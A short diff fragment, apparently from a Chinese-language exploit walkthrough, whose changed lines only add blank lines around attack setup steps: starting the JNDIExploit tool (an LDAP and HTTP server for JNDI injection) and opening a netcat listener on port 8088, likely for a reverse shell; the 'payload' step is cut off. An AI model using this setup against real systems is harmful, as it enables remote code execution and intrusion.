@@ -5,9 +5,12 @@
 eleven@192 ~> java -jar   JNDIExploit-1.3-SNAPSHOT.jar -i 127.0.0.1
 [+] LDAP Server Start Listening on 1389...
 [+] HTTP Server Start Listening on 3456...
+
+
 2、nc 开启监听
 
 eleven@192 ~> nc -l 127.0.0.1 8088 -v
+
  
 3、payload：
 
